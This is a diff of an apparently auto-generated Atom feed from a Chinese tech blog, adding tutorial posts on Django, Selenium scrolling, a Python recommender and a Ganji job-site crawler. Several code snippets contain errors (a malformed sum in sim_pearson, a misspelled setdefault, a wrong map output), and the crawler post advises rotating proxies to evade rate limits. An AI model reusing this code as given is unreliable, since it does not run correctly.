-<p>剧情方面也是往「神作」路线走，「丧尸围城」想想都啪，我感觉比「进击的巨人」还令人毛骨悚然，有被禁的可能。人物设计方面也挺好，女主似乎拥有异于常人的能力，脚很好看，而男主则疑似为高智商中二少年。听觉和视觉双管齐下，剧情似乎也不赖，会是神作吗？</p>
-<p>总之我相当期待后续发展。</p>
-<h2 id="周六"><a href="#周六" class="headerlink" title="周六"></a><span>周六</span></h2><h3 id="逆转裁判"><a href="#逆转裁判" class="headerlink" title="逆转裁判"></a>逆转裁判</h3><p>成步堂龙一（简称成龙）是个律师，骑着儿童自行车来回于家里和法院，和一个个恶劣的歹徒、检察官斗智斗勇，展开了一段段精彩的辩护故事。</p>
-<h2 id="周日"><a href="#周日" class="headerlink" title="周日"></a><span>周日</span></h2><h3 id="忍者杀手-SE"><a href="#忍者杀手-SE" class="headerlink" title="忍者杀手 SE"></a>忍者杀手 SE</h3><p>四月另一个笑点十足的番，它的诡异之处就是它的画风，这种独特的 「PPT画风」看似节省经费却带来了意想不到的笑点。而剧情也显而易见，将死之人被曾经的忍者附身而复活。被忍者杀死的男主则被某神祕的忍者灵魂附身了，开始了消灭「忍者」之路。此番唯一正常的就是女性角色的作画，不管是造型还是乳量都是非常正常且好看的。</p>
-<p><img src="https://o68eee1f9.qnssl.com/a15b4afegw1f397cnma1xj21gy13mgvd.jpeg" alt="ninja se"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;周一&quot;&gt;&lt;a href=&quot;#周一&quot; class=&quot;headerlink&quot; title=&quot;周一&quot;&gt;&lt;/a&gt;&lt;span&gt;周一&lt;/span&gt;&lt;/h2&gt;&lt;h3 id=&quot;Re：从零开始的异世界生活&quot;&gt;&lt;a href=&quot;#Re：从零开始的异世界生活&quot; class=&quot;heade
-    
-    </summary>
-    
-    
-      <category term="animes" scheme="https://blog.whilte.cn/tags/animes/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>为什么我不会结婚</title>
-    <link href="https://blog.whilte.cn/2016/04/02/why-i-wont-marry/"/>
-    <id>https://blog.whilte.cn/2016/04/02/why-i-wont-marry/</id>
-    <published>2016-04-02T11:27:34.000Z</published>
-    <updated>2017-04-23T10:44:16.171Z</updated>
+    <title>Django MTV模型</title>
+    <link href="https://blog.whilte.cn/2017/04/08/Django-stu/"/>
+    <id>https://blog.whilte.cn/2017/04/08/Django-stu/</id>
+    <published>2017-04-08T06:18:56.000Z</published>
+    <updated>2017-04-23T10:38:26.184Z</updated>
     
     <content type="html"><![CDATA[<ul>
-<li>有生理缺陷</li>
-<li>有心理缺陷</li>
-<li>没有值得喜欢的人</li>
+<li>MTV 模型</li>
 </ul>
+<p>简单的向服务器发送一个requests，服务器会返回一个responses。</p>
+<p>具体的操作为：</p>
+<p>发送一个请求， requests 会到views区， 找到特定的views， views到models层查找数据， models为托管数据的层级和一些对数据进行操作， 接下来会将找到的数据到templates层，templates来展示数据。这就是简单的 MTV 模型</p>
+<ul>
+<li>创建 Django 项目</li>
+</ul>
+<p>使用pycharm中的terminal：</p>
+<pre><code>python3 manage.py startproject tango
+</code></pre><ul>
+<li><strong>init</strong>.py:这是一个空的脚本,用来告诉Python编译器这个目录是一个Python包.</li>
+<li>settings.py:用来存储Django项目设置的文件.</li>
+<li>urls.py:用来存储项目里的URL模式.</li>
+<li>wsgi.py:用来帮助你运行开发服务,同时可以帮助部署你的生产环境.</li>
+</ul>
+<p>在新的 Djangoapp 项目中的文件：</p>
+<ul>
+<li><strong>init</strong>.py，前面的功能一样.</li>
+<li>models.py,一个存储你的应用中数据模型的地方 - 在这里描述数据的实体和关系.</li>
+<li>tests.py,存储你应用的测试代码.</li>
+<li>views.py,在这里处理用户请求和响应.</li>
+<li>admin.py,在这里你可以向Django注册你的模型,它会为你创建Django的管理界面.</li>
+</ul>
+<p>新建一个项目后要在 setting.py 中设置 INSTALLED_APPS 元组 中 加入新建app的名字， 这样django就可以识别le。</p>
+<ul>
+<li>创建视图</li>
+</ul>
+<p>在views.py 中， 加入：</p>
+<pre><code>from django.shortcuts import render
+def index(requests):
+    return render(requests, &#39;index.html&#39;)
+</code></pre><p>需要在templates中新建一个html文件为index。</p>
+<ul>
+<li>分配url<br>在urls.py中，添加代码：</li>
+</ul>
+<pre><code>from django.conf.urls import url
+from django.contrib import admin
+from tango.views import index # 导入views层中的index
+
+urlpatterns = [
+    url(r&#39;^admin/&#39;, admin.site.urls),
+    url(r&#39;^index/&#39;, index) # 增加urls
+]
+</code></pre><ul>
+<li>运行服务</li>
+</ul>
+<p>在termainl中：</p>
+<pre><code>python3 manage.py runserver
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;MTV 模型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;简单的向服务器发送一个requests，服务器会返回一个responses。&lt;/p&gt;
+&lt;p&gt;具体的操作为：&lt;/p&gt;
+&lt;p&gt;发送一个请求， requests 会到views区， 找到特定的views， views到mode
+    
+    </summary>
+    
+    
+      <category term="Django" scheme="https://blog.whilte.cn/tags/Django/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>selenium实现浏览器下拉页面</title>
+    <link href="https://blog.whilte.cn/2017/04/04/selenium%E6%9D%A5%E6%A8%A1%E4%BB%BF%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8B%E6%8B%89%E9%A1%B5%E9%9D%A2/"/>
+    <id>https://blog.whilte.cn/2017/04/04/selenium来模仿浏览器下拉页面/</id>
+    <published>2017-04-04T09:55:35.000Z</published>
+    <updated>2017-04-05T08:38:51.922Z</updated>
+    
+    <content type="html"><![CDATA[<p>在我爬取美团数据的时候，发现美团的整个页面数据采用ajax来加载，ajax 就是异步的javascript和XML, 我也不是很懂， 近期打算学习js，它的功能就是网站不需要使用单独的页面请求就可以和服务器进行交互，表单采用Ajax与服务器通信。</p>
+<p>要想获得全部的数据，需要下拉到底页面才会完全加载本页面的全部内容。</p>
+<p>这里其时有两种办法，来进行爬取：<br><a id="more"></a></p>
+<ol>
+<li><p>抓包分析请求，找到真实的请求，来模拟请求，获得数据。</p>
+</li>
+<li><p>使用selenium来进行爬取，但是其效率不高。</p>
+</li>
+</ol>
+<p>由于我爬取的数据量较小，我只需要几个分类下的数据。我采用第二种。（第一种，模拟起来很麻烦）。</p>
+<pre><code># 导入第三方库
+from selenium import webdriver
+import time
+from bs4 import BeautifulSoup
+
+# 你可以使用 phantomjs 或者使用 chrome
+driver = webdriver.PhantomJS(executable_path=&#39;/home/jasd/python/phantomjs/bin/phantomjs&#39;)
+# driver = webdriver.Chrome()
+
+def get_info(page):
+
+    driver.get(full_url)
+    time.sleep(2)
+# 这里我使用 js 的方法，来实现下拉页面
+    js = &quot;window.scrollTo(0,document.body.scrollHeight)&quot;
+# 使用的执行 JavaScript
+    driver.execute_script(js)
+# 休眠 3 秒种
+    time.sleep(3)
+# 重复执行多次， 确保页面已完全加载
+    js = &quot;window.scrollTo(0,document.body.scrollHeight)&quot;
+    driver.execute_script(js)
+    time.sleep(3)
+    js = &quot;window.scrollTo(0,document.body.scrollHeight)&quot;
+    driver.execute_script(js)
+    time.sleep(3)
+    js = &quot;window.scrollTo(0,document.body.scrollHeight)&quot;
+    driver.execute_script(js)
+    time.sleep(3)
+    js = &quot;window.scrollTo(0,document.body.scrollHeight)&quot;
+    driver.execute_script(js)
+    time.sleep(3)
+    js = &quot;window.scrollTo(0,document.body.scrollHeight)&quot;
+    driver.execute_script(js)
+    time.sleep(3)
+    js = &quot;window.scrollTo(0,document.body.scrollHeight)&quot;
+    driver.execute_script(js)
+    time.sleep(3)
+
+# 这里使用 page_source 的方法， 我还是比较喜欢使用BeautifulSoup， 虽然效率有点低
+    pageSoure = driver.page_source
+    soup = BeautifulSoup(pageSoure, &#39;lxml&#39;)
+# 退出
+    driver.quit()
+
+get_info(i)
+</code></pre><p>我觉得代码写的很挫。。。。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在我爬取美团数据的时候，发现美团的整个页面数据采用ajax来加载，ajax 就是异步的javascript和XML, 我也不是很懂， 近期打算学习js，它的功能就是网站不需要使用单独的页面请求就可以和服务器进行交互，表单采用Ajax与服务器通信。&lt;/p&gt;
+&lt;p&gt;要想获得全部的数据，需要下拉到底页面才会完全加载本页面的全部内容。&lt;/p&gt;
+&lt;p&gt;这里其时有两种办法，来进行爬取：&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="spider" scheme="https://blog.whilte.cn/tags/spider/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>简单推荐(python)</title>
+    <link href="https://blog.whilte.cn/2017/04/01/%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F-python/"/>
+    <id>https://blog.whilte.cn/2017/04/01/推荐系统-python/</id>
+    <published>2017-04-01T08:08:46.000Z</published>
+    <updated>2017-04-05T08:38:29.930Z</updated>
+    
+    <content type="html"><![CDATA[<ul>
+<li>协作型过滤</li>
+</ul>
+<p>一个协作型过滤算法通常会对一大群人进行搜索， 并从中找出与我们品味相近的一小群人。算法会对这些人所偏爱的内容进行分析，并将它们组合构建一个经过排名的列表。</p>
+<ul>
+<li>寻找相近的用户</li>
+</ul>
+<p>有很多相似度评价值的体系，我将写的是 欧几里德距离和皮尔逊相关系数。</p>
+<ul>
+<li>欧几里德距离</li>
+</ul>
+<p>欧几里得距离就是，比如在平面直角坐标系中，欧几里得距离就是两点的距离方程。</p>
+<p>两点距离公式：</p>
+<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/bfa1815838113388d78c9402bba7308d734a4af2" alt="oujilide"></p>
+<a id="more"></a>
+<p>欧几里得距离计算的代码</p>
+<pre><code>from math import sqrt
+
+
+def sim_distance(dataset, person1, person2):
+# common 为两者共同的之处
+        common = {}
+        for item in dataset[person1]:
+                if item in dataset[person2]:
+                        common[item] = 1
+
+# 没有共同之处， 则返回0
+        if len(common) == 0: return 0
+
+# 计算差值的平方和
+        sum_of_squares = sum([pow(dataset[person1][item] - dataset[person2][item], 2) for item in dataset[person1] if item in dataset[person2]])
+
+# 我将函数值加1， 避免除数为0的情况， 并取倒数
+        return 1 / (1 + sqrt(sum_of_squares))
+</code></pre><ul>
+<li>皮尔逊相关系数</li>
+</ul>
+<p>关于皮尔逊相关系数，首先是协方差。</p>
+<p>协方差是描述相互关联程度的一个特征数就是协方差。定义：</p>
+<blockquote>
+<p>设（X, Y) 是二维的随机变量， 若 E[(X - E(X))(Y - E(Y))] 存在，则称此数学期望为 X 和 Y 的协方差， 或称为 X与Y的相关（中心）距。</p>
+</blockquote>
+<p>协方差为 X的偏差与Y的偏差的乘积的数学期望。</p>
+<p>协方差公式：</p>
+<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/3b2f5356a89c413a67fbb16292ed80e3187fbc86" alt="cov"></p>
+<p>协方差是有量纲的量，比如X表示人的身高， 单位是 m， Y表示人的体重， 单位是 kg，则 Cov(X, Y)带有量纲（m.kg), 为了消除量纲的影响，对协方差除以相同量纲的量，就得到相关系数。</p>
+<p>相关系数公式：</p>
+<p><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/8b0d0608b5f85d24a9c572f8d1b5769289664dfb" alt="pearson"></p>
+<p>除以X和Y的标准差的乘积。</p>
+<p>公式1:</p>
+<p><img src="http://oava7ylm5.bkt.clouddn.com/19961_12788382715I69.gif" alt="foum1"></p>
+<p>公式2:</p>
+<p><img src="http://oava7ylm5.bkt.clouddn.com/19961_1278843346L5kz.gif" alt="foum2"></p>
+<p>公式2 为样本的相关系数</p>
+<p>皮尔逊相关系数计算代码：</p>
+<pre><code>from math import sqrt
+
+
+def sim_pearson(prefs, p1, p2):
+    common = {}
+    for item in prefs[p1]:
+        if item in prefs[p2]:
+            common[item] = 1
+
+    n = len(common)
+    if n == 0: return 0
+
+    sum1 = sum([prefs[p1][it] for it in common])
+    sum2 = sum([prefs[p2][it] for it in common])
+
+    sum1Sq = sum([pow(prefs[p1][it], 2) for it in common])
+    sum2Sq = sum([pow(prefs[p2][it], 2) for it in common])
+
+    pSum = sum([prefs][p1][it]*prefs[p2][it] for it in common)
+
+    # 计算
+    xfc = pSum - (sum1 * sum2) / n
+    bzc = sqrt((sum1Sq - pow(sum1, 2) / n) * (sum2Sq - pow(sum2, 2) / n))
+
+    if bzc == 0 : return 0
+    pearson = xfc / bzc
+
+    return pearson
+</code></pre><ul>
+<li>推荐物品</li>
+</ul>
+<p>一个受更多人评论的物品会对结果产生更大的影响， 为了修正这样的问题，要除以它所代表的对着个物品评论的人的相似度之和。</p>
+<pre><code># 利用所有人的评价值的加权平均， 为某人提供建议
+def getRecommendations(prefs, person, similarity=sim_pearson):
+    totals = {}
+    simSums = {}
+    for other in prefs:
+    # 不和自己作比较
+        if other == person:
+            continue
+        sim = similarity(prefs, person, other)
+
+        # 忽略评价值小于0或等于0的情况
+        if sim &lt; 0:
+            continue
+
+        for item in prefs[other]:
+
+        # 只对自己还未评价的物品评价
+            if item not in prefs[person] or prefs[person][item] == 0:
+
+                totals.setdefalult(item, 0)
+                totals[item] += prefs[other][item]*sim
+
+                simSums.setdefalult(item, 0)
+                simSums[item] += sim
+
+    # 生成列表
+    rankings = [(total / simSums[item], item) for item in totals.items()]
+
+    rankings.sort()
+    rankings.reverse()
+    return rankings
+</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;协作型过滤&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;一个协作型过滤算法通常会对一大群人进行搜索， 并从中找出与我们品味相近的一小群人。算法会对这些人所偏爱的内容进行分析，并将它们组合构建一个经过排名的列表。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;寻找相近的用户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;有很多相似度评价值的体系，我将写的是 欧几里德距离和皮尔逊相关系数。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;欧几里德距离&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;欧几里得距离就是，比如在平面直角坐标系中，欧几里得距离就是两点的距离方程。&lt;/p&gt;
+&lt;p&gt;两点距离公式：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://wikimedia.org/api/rest_v1/media/math/render/svg/bfa1815838113388d78c9402bba7308d734a4af2&quot; alt=&quot;oujilide&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://blog.whilte.cn/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>赶集网爬虫</title>
+    <link href="https://blog.whilte.cn/2017/03/28/%E8%B5%B6%E9%9B%86%E7%BD%91%E7%88%AC%E8%99%AB/"/>
+    <id>https://blog.whilte.cn/2017/03/28/赶集网爬虫/</id>
+    <published>2017-03-28T08:08:46.000Z</published>
+    <updated>2017-04-23T10:54:10.690Z</updated>
+    
+    <content type="html"><![CDATA[<p>爬虫地址：<a href="https://github.com/jianaosiding/crawl1" target="_blank" rel="external">spider</a></p>
+<p>赶集网的爬虫，爬取赶集网上的招聘的板块上的信息并储存。<br><em>算是以深度优先来进行爬取</em></p>
+<p><em>爬虫的目的是收集数据，数据的格式要便于处理和分析。</em></p>
+<h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><ul>
+<li>MongoDB</li>
+<li>requests</li>
+<li>pymongo</li>
+<li>BeautifulSoup and lxml</li>
+</ul>
+<h4 id="关于爬虫"><a href="#关于爬虫" class="headerlink" title="关于爬虫"></a>关于爬虫</h4><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><ol>
+<li>确定已安装MongoDB，Python3.5, 浏览器建议使用Chrome。</li>
+<li><p>安装需要的Python的第三方库:</p>
+<pre><code> 在 terminal(cmd) 中输入：
+
+ win:
+
+ pip install requests, BeautifulSoup4, pymongo, lxml
+
+ linux:
+
+ sudo pip3 install requests, BeautifulSoup4, pymongo, lxml
+</code></pre></li>
+<li><p>如果你知道更好(不知道也可以)：</p>
+<ul>
+<li>一点 HTML CSS HTTP and MongoDB</li>
+</ul>
+</li>
+</ol>
+<a id="more"></a>
+<h5 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h5><p><img src="http://oava7ylm5.bkt.clouddn.com/test.jpg" alt="test"></p>
+<ul>
+<li><p>Spider 1 从<a href="http://bj.ganji.com/zhaopin/" target="_blank" rel="external">列表页</a>中获取页面下全部的个分类的链接，然后将分类的链接储存到 url_list 这个collection中。</p>
+</li>
+<li><p>Spider 2 从url_list 中获取储存的链接并解析，获取链接的详情页，将详情页中的想要抓取的信息储存到 item_info 中。</p>
+</li>
+</ul>
+<h5 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h5><p><img src="http://oava7ylm5.bkt.clouddn.com/liuchengtu.png" alt="liuchengtu"></p>
+<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><h5 id="首先要观察爬取网站的页面结构"><a href="#首先要观察爬取网站的页面结构" class="headerlink" title="首先要观察爬取网站的页面结构"></a>首先要观察爬取网站的页面结构</h5><ul>
+<li>首先从<a href="http://bj.ganji.com/zhaopin/" target="_blank" rel="external">起始页</a>来看，我的目的是将其中的 销售， 行政， 后勤等这样的类别的链接提取出来。</li>
+<li>其次到这样的<a href="http://bj.ganji.com/zpshichangyingxiao/" target="_blank" rel="external">类别页</a>中， 我的目的是将 所有招聘职位的链接 爬取下来并储存到url_list表中，</li>
+<li>然后从数据库url_list表中，迭代其中的链接，解析出<a href="http://bj.ganji.com/zpfangjingjiren/2593320747x.htm" target="_blank" rel="external">详情页</a>，提取出我想要的信息。就是这样一步一步的深入它的页面结构</li>
+</ul>
+<h5 id="channel-url文件-为将招聘板块中的招聘职位分类的链接提取出来。"><a href="#channel-url文件-为将招聘板块中的招聘职位分类的链接提取出来。" class="headerlink" title="channel_url文件 为将招聘板块中的招聘职位分类的链接提取出来。"></a>channel_url文件 为将招聘板块中的招聘职位分类的链接提取出来。</h5><p>这里的 <a href="http://docs.python-requests.org/zh_CN/latest/index.html" target="_blank" rel="external">requests</a> 的作用:</p>
+<blockquote>
+<p>Requests 唯一的一个非转基因的 Python HTTP 库，人类可以安全享用。<br><em>警告：非专业使用其他 HTTP 库会导致危险的副作用，包括：安全缺陷症、冗余代码症、重新发明轮子症、啃文档症、抑郁、头疼、甚至死亡。</em></p>
+</blockquote>
+<p>requests 的基本用法:</p>
+<pre><code>import requests
+# 发起get请求
+data = requests.get(&#39;http://www.baidu.com&#39;)
+# 打印data
+print(data.text)
+# .....
+# 其中还可以设置 headers and proxies
+# headers 是访问一个网站的头部信息， 通常在可在 浏览器的开发者工具中看到
+# 如 chrome: 检查 &gt; network &gt; headers
+# 使用headers 的作用是看起来像一个人一样的访问
+# 由于网站可能限制了一个ip访问的频率，所以使用代理ip
+</code></pre><p><em>关于代理ip</em> 可以在 <a href="http://cn-proxy.com/" target="_blank" rel="external">http://cn-proxy.com/</a> 找到， 当然也可以写一个爬虫，将代理爬下来。</p>
+<p>有关http的头字段可以参见 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5%E5%88%97%E8%A1%A8" target="_blank" rel="external">http头字段</a></p>
+<p><em>headers 的位置</em>：<br><img src="http://oava7ylm5.bkt.clouddn.com/headers.png" alt="img"></p>
+<p>这里的 BeautifulSoup and lxml的作用：</p>
+<blockquote>
+<p>Beautiful Soup 是一个可以从HTML或XML文件中提取数据的Python库, 这里我使用 lxml 来解析。</p>
+</blockquote>
+<p><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/#" target="_blank" rel="external">BeautifulSoup</a> 的基本用法：</p>
+<pre><code>from bs4 import BeautifulSoup
+# 以下是一个非常经典的写法，其中 data.text是做汤的原料， lxml 是菜谱，BeautifulSoup 将其做成
+soup = BeautifulSoup(data.text, &#39;lxml&#39;)
+# BeautifulSoup 有 select and find 两种提取信息的方式
+# select 用的是css选择器
+img = soup.select(&#39;#lg &gt; img&#39;)
+# find 方法可以根据标签和属性来提取信息
+img = soup.find(&#39;img&#39;, {&#39;hidefocus&#39;: &quot;true&quot;})
+# 此外 find 还有 findAll() and find_all() 方法 可参见文档
+</code></pre><p>channel_url 中定义了一个函数， 来进行获取链接，我这里将运行的结果，赋给了channel_list, 当然也可以放进数据库。<br><img src="http://oava7ylm5.bkt.clouddn.com/chanenl_list.png" alt="images"></p>
+<h5 id="page-spider-是进行爬取的主要文件，-其中定义两个函数，是进行爬取信息的两个爬虫。"><a href="#page-spider-是进行爬取的主要文件，-其中定义两个函数，是进行爬取信息的两个爬虫。" class="headerlink" title="page_spider 是进行爬取的主要文件， 其中定义两个函数，是进行爬取信息的两个爬虫。"></a>page_spider 是进行爬取的主要文件， 其中定义两个函数，是进行爬取信息的两个爬虫。</h5><p>这里的 pymongo:</p>
+<blockquote>
+<p>PyMongo is a Python distribution containing tools for working with MongoDB, and is the recommended way to work with MongoDB from Python. This documentation attempts to explain everything you need to know to use PyMongo.</p>
+</blockquote>
+<p>pymongo 的基本用法：</p>
+<pre><code>import pymongo
+# 连接pymongo
+client = pymongo.MongoClient(&#39;localhost&#39;, 27017)
+# 连接到数据库
+ganji = client[&#39;ganji&#39;]
+# 连接到数据库中的一个表(集合)
+url_list = ganji[&#39;url_list&#39;]
+# pymongo 的一些方法: 单个插入数据
+url_list1.insert_one({&#39;url&#39;: url})
+# 对数据库中的数据进行计数
+url_list1.find().count()
+</code></pre><p>关于 <em>正则表达式</em>：<br>python 中的正则表达式为 re模块， 基本用法：</p>
+<pre><code>import re
+# 进行正则匹配
+re.complie(&#39;^(https?://)?bj\.ganji\.com.*\.htm&#39;)
+</code></pre><p>正则表达式可以参见：<a href="http://www.runoob.com/python/python-reg-expressions.html" target="_blank" rel="external">正则表达式</a></p>
+<p>一个正则表达式的测试网站：<a href="http://www.pyregex.com/" target="_blank" rel="external">PyRegex</a></p>
+<h6 id="其中的函数-get-link-form-的一些细节："><a href="#其中的函数-get-link-form-的一些细节：" class="headerlink" title="其中的函数 get_link_form 的一些细节："></a>其中的函数 get_link_form 的一些细节：</h6><ol>
+<li><p>url_views 是对其url 的观察构造的，例如 <a href="http://bj.ganji.com/zpshichangyingxiao/o3/" target="_blank" rel="external">http://bj.ganji.com/zpshichangyingxiao/o3/</a> 为其第三页的url， 我将其写成 url_views = ‘{0}o{1}/‘.format(channel, str(page)) ， channel 和 page 为这个函数的参数</p>
+</li>
+<li><p>我的计划是爬去100页， 但是有的页面可能没有100页， 用if来判断是否有要爬去的信息，有则爬，无则pass， 具体的判断的依据是 <em>每个页面下都会有的 下一页的选项</em>。</p>
+</li>
+<li><p>由于findAll所返回的对象是一个列表，所以用for循环来进行迭代并储存。</p>
+</li>
+</ol>
+<h6 id="其中get-item-info-的细节："><a href="#其中get-item-info-的细节：" class="headerlink" title="其中get_item_info 的细节："></a>其中get_item_info 的细节：</h6><ol>
+<li>与上一个函数相似，这个主要是将每一个职位招聘的详情信息，提取并储存。但是要判断一下，这个商品是否已经成交或者下架，如果成交或者下架，那么访问这个页面时状态码应该返回 404. 所以用if判断状态码来进行爬去。</li>
+</ol>
+<h6 id="main-文件主要是调用page-spider的爬虫进行爬取"><a href="#main-文件主要是调用page-spider的爬虫进行爬取" class="headerlink" title="main 文件主要是调用page_spider的爬虫进行爬取"></a>main 文件主要是调用page_spider的爬虫进行爬取</h6><p>multiprocessing 为python的多进程模块，采用多进程爬取。</p>
+<pre><code>from multiprocessing import Pool
+# 如果要启动大量的子进程，可以用进程池的方式批量创建子进程
+pool = Pool(4)
+for link in url_list1.find({}, {&#39;_id&#39;: 0, &#39;url&#39;: 1}):
+        pool.apply(get_item_info, args=(link[&#39;url&#39;],))
+pool.close()
+pool.join()
+# pool = Pool(4) 就可以运行 4 个进程， Pool的默认大小是CPU的核数
+# 对Pool对象调用join()方法会等待所有子进程执行完毕，调用join()之前必须先调用close()，调用close()之后就不能继续添加新的Process了
+# map 函数是一个语法糖， map 函数接受两个参数， 一个序列， 一个函数， 并把结果通过Iterator(迭代器)返回
+test = map(lambda x: x*x, [1, 2, 3, 4, 5, 6, 7, 8, 9])
+test 为 &lt;map object at 0x7f998e02c7b8&gt;
+list(test)
+[1, 4, 9, 16, 16, 25, 36, 49, 64, 81]
+</code></pre><h5 id="count-文件主要是在main-py-运行时，-每5秒来检查一次数据库中数据的数量。"><a href="#count-文件主要是在main-py-运行时，-每5秒来检查一次数据库中数据的数量。" class="headerlink" title="count 文件主要是在main.py 运行时， 每5秒来检查一次数据库中数据的数量。"></a>count 文件主要是在main.py 运行时， 每5秒来检查一次数据库中数据的数量。</h5><h6 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h6><p><img src="http://oava7ylm5.bkt.clouddn.com/xiaoguotu1.png" alt="xiaoguotu1"><br><img src="http://oava7ylm5.bkt.clouddn.com/xiaoguotu2.png" alt="xiaoguotu2"></p>
+<h6 id="运行时的截图："><a href="#运行时的截图：" class="headerlink" title="运行时的截图："></a>运行时的截图：</h6><p><img src="http://oava7ylm5.bkt.clouddn.com/sometime2.png" alt="sometime"></p>
+<h5 id="爬取结果"><a href="#爬取结果" class="headerlink" title="爬取结果"></a>爬取结果</h5><p>我的MongoDB中， 其中 url_list的 count 为:<em>120166</em>, item_info的 count为:<em>30726</em>.</p>
+<p>可能是我url_list先于item_info爬取，url_list有些链接已经失效。</p>
+<h5 id="体会"><a href="#体会" class="headerlink" title="体会"></a>体会</h5><p>我之前写过58同城的爬虫和这个类似， 但是写这个的时候bug明显更多。</p>
+<p>不同的网站会有不同的抓取策略。</p>
+<p><em>写爬虫会有很多的坑，验证码，采集JavaScript，模拟登录等都是要克服的。</em></p>
+<p>还有一些网站的数据加载方式， 比如美团，美团的数据加载使用的是 ajax(异步加载JavaScript和XML)，用selenium虽然可以,但是效率低。抓包分析效率高，但是很难模仿请求。我比较偏于分析请求。所以要了解网站的一些常见的反爬措施和网页的结构。</p>
+<p>赶集网这种网站页面结构很适合爬取， 但是它对同一ip的访问频率会有限制。</p>
+<p>这个程序的效率还可以优化，<em>例如 使用 lxml 来解析网页， 速度会快大概10倍的样子， 还可以利用 异步非阻塞 优化， </em>虽然我不会。 我会继续学习的。**</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;爬虫地址：&lt;a href=&quot;https://github.com/jianaosiding/crawl1&quot;&gt;spider&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;赶集网的爬虫，爬取赶集网上的招聘的板块上的信息并储存。&lt;br&gt;&lt;em&gt;算是以深度优先来进行爬取&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;爬虫的目的是收集数据，数据的格式要便于处理和分析。&lt;/em&gt;&lt;/p&gt;
+&lt;h4 id=&quot;依赖&quot;&gt;&lt;a href=&quot;#依赖&quot; class=&quot;headerlink&quot; title=&quot;依赖&quot;&gt;&lt;/a&gt;依赖&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;MongoDB&lt;/li&gt;
+&lt;li&gt;requests&lt;/li&gt;
+&lt;li&gt;pymongo&lt;/li&gt;
+&lt;li&gt;BeautifulSoup and lxml&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&quot;关于爬虫&quot;&gt;&lt;a href=&quot;#关于爬虫&quot; class=&quot;headerlink&quot; title=&quot;关于爬虫&quot;&gt;&lt;/a&gt;关于爬虫&lt;/h4&gt;&lt;h5 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h5&gt;&lt;ol&gt;
+&lt;li&gt;确定已安装MongoDB，Python3.5, 浏览器建议使用Chrome。&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;安装需要的Python的第三方库:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt; 在 terminal(cmd) 中输入：
+
+ win:
+
+ pip install requests, BeautifulSoup4, pymongo, lxml
+
+ linux:
+
+ sudo pip3 install requests, BeautifulSoup4, pymongo, lxml
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;如果你知道更好(不知道也可以)：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;一点 HTML CSS HTTP and MongoDB&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://blog.whilte.cn/tags/python/"/>
+    
+      <category term="spider" scheme="https://blog.whilte.cn/tags/spider/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>python的一些糖</title>
+    <link href="https://blog.whilte.cn/2017/03/16/python-tip/"/>
+    <id>https://blog.whilte.cn/2017/03/16/python-tip/</id>
+    <published>2017-03-16T10:09:01.000Z</published>
+    <updated>2017-04-05T08:38:45.062Z</updated>
+    
+    <content type="html"><![CDATA[<ul>
+<li>reduce</li>
+</ul>
+<p>reduce 把一个函数作用在序列上， 这个函数必须有两个参数， 它把结果继续作用在序列的下一个元素上。</p>
+<p>比如一个列表内元素的所用的乘积：</p>
+<pre><code>from functools import reduce
+
+list = [1, 2, 3, 4, 5, 6, 7, 8, 9]
+
+reduce(lambda x, y: x*y, list)
+
+return 362880
+</code></pre><a id="more"></a>
+<ul>
+<li>map</li>
+</ul>
+<p>map 函数接受两个参数， 一个序列， 一个函数， 并把结果通过Iterator(迭代器)返回</p>
+<pre><code>test = map(lambda x: x*x, [1, 2, 3, 4, 5, 6, 7, 8, 9])
+
+test 为 &lt;map object at 0x7f998e02c7b8&gt;
+
+list(test)
+
